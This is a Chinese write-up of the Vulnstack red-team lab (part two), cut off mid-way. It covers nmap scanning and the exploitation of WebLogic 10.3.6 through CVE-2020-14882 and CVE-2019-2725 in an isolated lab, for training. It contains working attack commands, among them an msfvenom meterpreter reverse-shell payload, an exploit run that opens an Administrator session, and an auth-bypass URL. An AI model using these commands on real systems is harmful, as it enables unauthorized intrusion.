{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(二)","contentHtml":"<h1>ATT&#x26;CK红队评估实战靶场(二)</h1>\n<blockquote>\n<p><a href=\"http://vulnstack.qiyuanxuetang.net/vuln/?page=2\">http://vulnstack.qiyuanxuetang.net/vuln/?page=2</a></p>\n</blockquote>\n<p>描述：红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：<code>1qaz@WSX</code></p>\n<p>（雾。。好多没听过的）</p>\n<ol>\n<li>Bypass UAC</li>\n<li>Windows系统NTLM获取（理论知识：Windows认证）</li>\n<li>Access Token利用（MSSQL利用）</li>\n<li>WMI利用</li>\n<li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li>\n<li>域内信息收集</li>\n<li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li>\n<li>域凭证收集</li>\n<li>后门技术（黄金票据/白银票据/Sid History/MOF）</li>\n</ol>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image19.png\" alt=\"image.png\"></p>\n<h2>靶场搭建</h2>\n<ol>\n<li>\n<p>网络配置信息，已经默认配置好，直接将网卡设置好即可</p>\n<p><strong>DC</strong> <code>IP</code>：10.10.10.10 <code>OS</code>：Windows 2012(64) <code>应用</code>：AD域</p>\n<p><strong>WEB</strong> <code>IP1</code>：10.10.10.80 <code>IP2</code>：192.168.111.80 <code>OS</code>：Windows 2008(64) <code>应用</code>：Weblogic 10.3.6 MSSQL 2008</p>\n<p><strong>PC</strong>  <code>IP1</code>：10.10.10.201 <code>IP2</code>：192.168.111.201 <code>OS</code>：Windows 7(32)</p>\n<p><strong>KALI</strong> <code>IP</code> ：192.168.111.150</p>\n</li>\n<li>\n<p>网卡设置</p>\n<p>NAT网卡网段改为<code>192.168.111.0</code> ,仅主机模式网卡网段改为<code>10.10.10.0</code> ；</p>\n</li>\n<li>\n<p>WEB主机默认账户是登陆不进去的，需要切换为<code>de1ay</code>账户登陆进去</p>\n<p>然后来到 <code>C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin</code></p>\n<p>依次使用管理员模式打开 <code>set domainenv</code> <code>startmanagerweblogic</code> <code>startweblogic</code></p>\n</li>\n<li>\n<p><code>kali</code>访问<code>http://192.168.111.80:7001/console</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image20.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<p><em><strong>开始渗透</strong></em></p>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p><code>Kali</code>的<code>ip</code>是<code>150</code> ，那么目标就是<code>80</code>以及<code>201</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.0</span>/<span class=\"hljs-number\">24</span>                   \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-16 15:39 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00051</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00035</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.80</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:AC:FA:<span class=\"hljs-title function_ invoke__\">FB</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.201</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00033</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:AD:EE:<span class=\"hljs-title function_ invoke__\">B7</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00038</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:E6:<span class=\"hljs-number\">0</span>E:<span class=\"hljs-number\">41</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.150</span>\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\"># 192.168.111.80</span>\nnmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.80</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-16 15:42 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.80</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.043</span>s latency).\nNot shown: <span class=\"hljs-number\">65521</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp    open  http\n<span class=\"hljs-number\">135</span>/tcp   open  msrpc\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds\n<span class=\"hljs-number\">1433</span>/tcp  open  ms-sql-s\n<span class=\"hljs-number\">3389</span>/tcp  open  ms-wbt-server\n<span class=\"hljs-number\">7001</span>/tcp  open  afs3-callback\n<span class=\"hljs-number\">49152</span>/tcp open  unknown\n<span class=\"hljs-number\">49153</span>/tcp open  unknown\n<span class=\"hljs-number\">49154</span>/tcp open  unknown\n<span class=\"hljs-number\">49155</span>/tcp open  unknown\n<span class=\"hljs-number\">49156</span>/tcp open  unknown\n<span class=\"hljs-number\">55068</span>/tcp open  unknown\n<span class=\"hljs-number\">60966</span>/tcp open  unknown\n<span class=\"hljs-comment\"># 192.168.111.201</span>\nnmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.201</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-16 15:44 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.201</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.044</span>s latency).\nNot shown: <span class=\"hljs-number\">65525</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">135</span>/tcp   open  msrpc\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds\n<span class=\"hljs-number\">3389</span>/tcp  open  ms-wbt-server\n<span class=\"hljs-number\">49152</span>/tcp open  unknown\n<span class=\"hljs-number\">49153</span>/tcp open  unknown\n<span class=\"hljs-number\">49154</span>/tcp open  unknown\n<span class=\"hljs-number\">49155</span>/tcp open  unknown\n<span class=\"hljs-number\">49156</span>/tcp open  unknown\n<span class=\"hljs-number\">60518</span>/tcp open  unknown\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:AD:EE:<span class=\"hljs-title function_ invoke__\">B7</span> (VMware)\n</code></pre>\n<p><code>192.168.111.80</code>存在<code>web</code>端口，所以是我们的优先目标</p>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">1433</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">7001</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.80</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-16 15:57 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">111.80</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0010</span>s latency).\n\nPORT     STATE SERVICE        VERSION\n<span class=\"hljs-number\">80</span>/tcp   open  http           Microsoft IIS httpd <span class=\"hljs-number\">7.5</span>\n<span class=\"hljs-number\">135</span>/tcp  open  msrpc          Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp  open  microsoft-ds   Microsoft Windows Server <span class=\"hljs-number\">2008</span> R2 - <span class=\"hljs-number\">2012</span> microsoft-ds\n<span class=\"hljs-number\">1433</span>/tcp open  ms-sql-s       Microsoft SQL Server <span class=\"hljs-number\">2008</span> R2 <span class=\"hljs-number\">10.50</span>.<span class=\"hljs-number\">4000</span>; SP2\n<span class=\"hljs-number\">3389</span>/tcp open  ms-wbt-server?\n<span class=\"hljs-number\">7001</span>/tcp open  http           Oracle WebLogic Server <span class=\"hljs-number\">10.3</span>.<span class=\"hljs-number\">6.0</span> (Servlet <span class=\"hljs-number\">2.5</span>; JSP <span class=\"hljs-number\">2.1</span>; T3 enabled)\n<span class=\"hljs-number\">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:<span class=\"hljs-comment\">//nmap.org/cgi-bin/submit.cgi?new-service :</span>\nSF-Port3389-TCP:V=<span class=\"hljs-number\">7.94</span>SVN%I=<span class=\"hljs-number\">7</span>%D=<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">16</span>%Time=<span class=\"hljs-number\">67385090</span>%P=x86_64-pc-linux-gnu%\nSF:<span class=\"hljs-title function_ invoke__\">r</span>(TerminalServerCookie,<span class=\"hljs-number\">13</span>,<span class=\"hljs-string\">\"\\x03\\0\\0\\x13\\x0e\\xd0\\0\\0\\x124\\0\\x02\\x01\\x08\\\nSF:0\\x02\\0\\0\\0\"</span>);\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:AC:FA:<span class=\"hljs-title function_ invoke__\">FB</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: phone|specialized|general purpose\n<span class=\"hljs-title function_ invoke__\">Running</span> (JUST GUESSING): Microsoft Windows Phone|<span class=\"hljs-number\">7</span>|<span class=\"hljs-number\">8.1</span>|<span class=\"hljs-number\">2008</span>|<span class=\"hljs-title function_ invoke__\">Vista</span> (<span class=\"hljs-number\">94</span>%)\nOS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.<span class=\"hljs-number\">1</span>:r1 cpe:/o:microsoft:windows_server_2008::<span class=\"hljs-variable constant_\">beta3</span> cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::<span class=\"hljs-variable constant_\">sp1</span> cpe:/o:microsoft:windows_8\nAggressive OS guesses: Microsoft Windows Phone <span class=\"hljs-number\">7.5</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">8.0</span> (<span class=\"hljs-number\">94</span>%), Microsoft Windows Embedded Standard <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">93</span>%), Microsoft Windows <span class=\"hljs-number\">8.1</span> <span class=\"hljs-title function_ invoke__\">R1</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">91</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">2008</span> Beta <span class=\"hljs-number\">3</span> (<span class=\"hljs-number\">90</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> R2 <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">8.1</span> (<span class=\"hljs-number\">90</span>%), Microsoft Windows Vista SP0 <span class=\"hljs-keyword\">or</span> SP1, Windows Server <span class=\"hljs-number\">2008</span> SP1, <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">90</span>%), Microsoft Windows Vista SP2, Windows <span class=\"hljs-number\">7</span> SP1, <span class=\"hljs-keyword\">or</span> Windows Server <span class=\"hljs-number\">2008</span> (<span class=\"hljs-number\">90</span>%), Microsoft Windows <span class=\"hljs-number\">7</span> Professional <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">8</span> (<span class=\"hljs-number\">89</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> R2 <span class=\"hljs-title function_ invoke__\">SP1</span> (<span class=\"hljs-number\">88</span>%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> <span class=\"hljs-title function_ invoke__\">host</span> (test conditions non-ideal).\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OSs: Windows, Windows Server <span class=\"hljs-number\">2008</span> R2 - <span class=\"hljs-number\">2012</span>; CPE: cpe:/o:microsoft:windows\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report any incorrect results at https:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">88.35</span> seconds\n</code></pre>\n<p>扫出系统版本<code>Microsoft Windows Server 2008 R2</code> ，以及<code>MSSQL</code> ，<code>Oracle WebLogic Server 10.3.6.0</code></p>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">1433</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">7001</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span>                                                                                                                                             \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">16</span> <span class=\"hljs-number\">16</span>:04 CST                                                                                                                                                \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span>                                                                                                                                                                               \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.0012</span>s latency).                                                                                                                                                                                     \n                                                                                                                                                                                                                  \nPORT     STATE SERVICE                                                                                                                                                                                            \n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http                                                                                                                                                                                               \n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.                                                                                                                                                  \n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.                                                                                                                                                             \n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.                                                                                                                                                              \n135/tcp  open  msrpc                                                                                                                                                                                              \n139/tcp  open  netbios-ssn                                                                                                                                                                                        \n445/tcp  open  microsoft-ds                                                                                                                                                                                       \n1433/tcp open  ms-sql-s                                                                                                                                                                                           \n| ssl-poodle:                                                                                                                                                                                                     \n|   VULNERABLE:                                                                                                                                                                                                   \n|   SSL POODLE information leak                                                                                                                                                                                   \n|     State: VULNERABLE                                                                                                                                                                                           \n|     IDs:  BID:70574  CVE:CVE-2014-3566            \n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other                            \n|           products, uses nondeterministic CBC padding, which makes it easier                           \n|           for man-in-the-middle attackers to obtain cleartext data via a                               \n|           padding-oracle attack, aka the \"POODLE\" issue.                                               \n|     Disclosure date: 2014-10-14                   \n|     Check results:                                \n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA               \n|     References:                                   \n|       https://www.securityfocus.com/bid/70574     \n|       https://www.imperialviolet.org/2014/10/14/poodle.html                                            \n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566                                     \n|_      https://www.openssl.org/~bodo/ssl-poodle.pdf                                                     \n|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)                                      \n3389/tcp open  ms-wbt-server                        \n7001/tcp open  afs3-callback                        \nMAC Address: 00:0C:29:AC:FA:FB (VMware)             \n\nHost script results:                                \n| smb-vuln-ms17-010:                                \n|   VULNERABLE:                                     \n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                            \n|     State: VULNERABLE  \n|     IDs:  CVE:CVE-2017-0143                       \n|     Risk factor: HIGH                             \n|       A critical remote code execution vulnerability exists in Microsoft SMBv1                         \n|        servers (ms17-010).                        \n|                                                   \n|     Disclosure date: 2017-03-14                                                                        \n|     References:                                                                                        \n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                               \n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143                                     \n|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED        \n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED                                                      \n|_smb-vuln-ms10-054: false\n</span></code></pre>\n<p>扫出主机<code>ms17-010</code>永恒之蓝，不过开放了<code>445</code>应该都会扫出来，以及<code>CVE-2014-3566</code> ，网上查阅说是信息泄露漏洞，<code>web</code>的好像没有扫出扫描漏洞，但是我们知道<code>7001</code>端口上是<code>WebLogic</code> ，可以查阅它的漏洞</p>\n<blockquote>\n<p><a href=\"https://zh.wikipedia.org/wiki/%E8%B4%B5%E5%AE%BE%E7%8A%AC%E6%BC%8F%E6%B4%9E\">https://zh.wikipedia.org/wiki/%E8%B4%B5%E5%AE%BE%E7%8A%AC%E6%BC%8F%E6%B4%9E</a></p>\n</blockquote>\n</li>\n</ol>\n<h2>web渗透</h2>\n<h3>80端口</h3>\n<ol>\n<li>\n<p>访问主页，是空页面</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image21.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>尝试扫描目录</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>,txt | grep -v <span class=\"hljs-string\">\"403\"</span>\n</code></pre>\n<p>啥也没有扫出来，转<code>7001</code>端口</p>\n</li>\n</ol>\n<h3>7001端口</h3>\n<ol>\n<li>\n<p>访问主页</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image22.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>发现<code>/console</code>能够正常访问到<code>weblogic</code>控制台</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image23.png\" alt=\"image.png\"></p>\n<p>可以在右下角找到版本号<code>WebLogic Server 版本: 10.3.6.0</code> ，和之前<code>nmap</code>扫描的一模一样</p>\n</li>\n<li>\n<p>查阅漏洞</p>\n<ul>\n<li>\n<p>通过<code>searchexploit</code> 搜索</p>\n<pre><code class=\"hljs language-python\">searchsploit WebLogic <span class=\"hljs-number\">10.3</span><span class=\"hljs-number\">.6</span><span class=\"hljs-number\">.0</span>\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                  |  Path\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nOracle Weblogic <span class=\"hljs-number\">10.3</span><span class=\"hljs-number\">.6</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> - Remote Command Execution                                                                                                                           | java/webapps/<span class=\"hljs-number\">47895.</span>py\nOracle Weblogic <span class=\"hljs-number\">10.3</span><span class=\"hljs-number\">.6</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> / <span class=\"hljs-number\">12.1</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> - Remote Code Execution                                                                                                                 | windows/webapps/<span class=\"hljs-number\">46780.</span>py\nOracle WebLogic Server <span class=\"hljs-number\">10.3</span><span class=\"hljs-number\">.6</span><span class=\"hljs-number\">.0</span> - Java Deserialization Remote Code Execution                                                                                                    | java/remote/<span class=\"hljs-number\">42806.</span>py\nOracle Weblogic Server <span class=\"hljs-number\">10.3</span><span class=\"hljs-number\">.6</span><span class=\"hljs-number\">.0</span> / <span class=\"hljs-number\">12.1</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">.0</span> / <span class=\"hljs-number\">12.2</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.2</span> / <span class=\"hljs-number\">12.2</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.3</span> - Deserialization Remote Command Execution                                                                     | multiple/remote/<span class=\"hljs-number\">44553.</span>py\nOracle WebLogic Server <span class=\"hljs-number\">10.3</span><span class=\"hljs-number\">.6</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> / <span class=\"hljs-number\">12.</span>x - Remote Command Execution                                                                                                             | multiple/remote/<span class=\"hljs-number\">43392.</span>py\nWebLogic Server <span class=\"hljs-number\">10.3</span><span class=\"hljs-number\">.6</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> / <span class=\"hljs-number\">12.1</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> / <span class=\"hljs-number\">12.2</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">.0</span> / <span class=\"hljs-number\">12.2</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span><span class=\"hljs-number\">.0</span> / <span class=\"hljs-number\">14.1</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> - Unauthenticated RCE via GET request                                                            | java/webapps/<span class=\"hljs-number\">48971.</span>py\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n</code></pre>\n<p>存在远程命令执行</p>\n</li>\n<li>\n<p>weblogic权限绕过（CVE-2020-14882）</p>\n<pre><code class=\"hljs language-python\">http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span>:<span class=\"hljs-number\">7001</span>/console/css/%252e%252e%252fconsole.portal\n</code></pre>\n<p>能直接进入后台，但是权限很低，无法利用</p>\n</li>\n<li>\n<p>CVE-2019-2725 反序列化远程代码执行</p>\n<ol>\n<li>\n<p>拉取上面<code>searchexploit</code> 的搜索到的<code>46780.py</code> ，然后跟根据文件内部<code>usage</code>食用</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># Script Usage:</span>\n<span class=\"hljs-comment\"># python exploit.py http://IP:PORT/_async/AsyncResponseServiceHttps</span>\n<span class=\"hljs-comment\"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=1234 -f psh-cmd > exploit.ps1</span>\n<span class=\"hljs-comment\"># Add the powershell command in the variable</span>\n</code></pre>\n</li>\n<li>\n<p>先通过<code>msfvenom</code>生成<code>payload</code>文件</p>\n<pre><code class=\"hljs language-python\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.150</span> LPORT=<span class=\"hljs-number\">1234</span> -f psh-cmd > exploit.ps1\n</code></pre>\n<p>然后将文件<code>exploit.ps1</code>里面的内容替换到<code>46780.py</code> 的<code>exploit</code>变量中的</p>\n</li>\n<li>\n<p><code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">msf6 > use exploit/multi/handler \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.150</span>\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">1234</span>\nmsf6 exploit(multi/handler) > run\n</code></pre>\n</li>\n<li>\n<p>执行脚本<code>46780.py</code> ，要通过<code>python2</code>执行</p>\n<pre><code class=\"hljs language-python\">python2 <span class=\"hljs-number\">46780.</span>py http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span>:<span class=\"hljs-number\">7001</span>/_<span class=\"hljs-keyword\">async</span>/AsyncResponseServiceHttps\nExploit Written by Avinash Kumar Thapa\nstatus_code:<span class=\"hljs-number\">202</span>\n&#x3C;Response [<span class=\"hljs-number\">202</span>]>\n</code></pre>\n</li>\n<li>\n<p>最后回到Kali可以发现反弹成功了，并且用户是<code>DE1AY\\Administrator</code></p>\n<pre><code class=\"hljs language-python\">msf6 > use exploit/multi/handler \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.150</span>\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">1234</span>\nmsf6 exploit(multi/handler) > run\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.150</span>:<span class=\"hljs-number\">1234</span> \n[*] Sending stage (<span class=\"hljs-number\">176198</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span>\n[*] Meterpreter session <span class=\"hljs-number\">1</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.150</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span>:<span class=\"hljs-number\">49303</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">16</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">27</span> +0800\n\nmeterpreter > getuid\nServer username: DE1AY\\Administrator\n</code></pre>\n</li>\n</ol>\n</li>\n</ul>\n</li>\n</ol>\n<h2>内网渗透</h2>\n<h3>MSF派生CS</h3>\n<ol>\n<li>\n<p>启动<code>CS</code>服务端，并用客户端连上</p>\n</li>\n<li>\n<p><code>CS</code>设置<code>HTTP</code>监听器</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image24.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>MSF使用<code>payload_inject</code> 模块</p>\n<pre><code class=\"hljs language-python\">meterpreter > bg\n[*] 